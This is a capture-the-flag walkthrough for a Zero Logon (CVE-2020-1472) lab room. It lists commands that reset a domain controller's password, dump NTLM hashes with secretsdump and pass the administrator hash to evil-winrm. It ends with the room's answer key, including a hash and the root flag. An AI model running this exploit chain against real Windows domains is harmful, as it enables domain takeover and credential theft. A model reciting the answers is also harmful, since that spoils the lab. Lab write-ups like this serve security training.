# Zero Logon - Hard

* This room covers the walkthrough for the Zero Logon exploit, which abuses a MS-NRPC (Microsoft NetLogon Remote Protocol) feature.

* We use the [Proof of Concept](https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py) and the [modified script](https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py) for this exploit to work.

```shell
python3 -m pip install virtualenv

python3 -m virtualenv impacketEnv

source impacketEnv/bin/activate

pip install git+https://github.com/SecureAuthCorp/impacket
#setting up impacket in virtualenv
```

```shell
nmap -T4 -A 10.10.187.79
#scan machine to get netbios name

#now we can use the zerologon.py script
python3 zerologon.py
#show syntax

python3 zerologon.py DC01 10.10.187.79
#exploits zero logon, changes password

secretsdump.py -just-dc-ntlm -no-pass DC01\$@10.10.187.79
#dumps hashes given domain controller and IP
#we can use admin hash to connect

evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.187.79
#get access

cd ..\Desktop

type root.txt
```

1. What method will allow us to change Passwords over NRPC? - NetrServerPasswordSet2()

2. What are the required fields for the method per the Microsoft Documentation? - PrimaryName, AccountName, SecureChannelType, ComputerName, Authenticator, ReturnAuthenticator, ClearNewPassword

3. What Opnumber is the method? - 30

4. What is the NetBIOS name of the Domain Controller? - DC01

5. What is the NetBIOS name of the network? - hololive

6. What domain are you attacking? - hololive.local

7. What is the Local Administrator's NTLM hash? - 3f3ef89114fb063e3d7fc23c20f65568

8. How many Domain Admin accounts are there? - 2

9. What is the root flag? - THM{Zer0Log0nD4rkTh1rty}
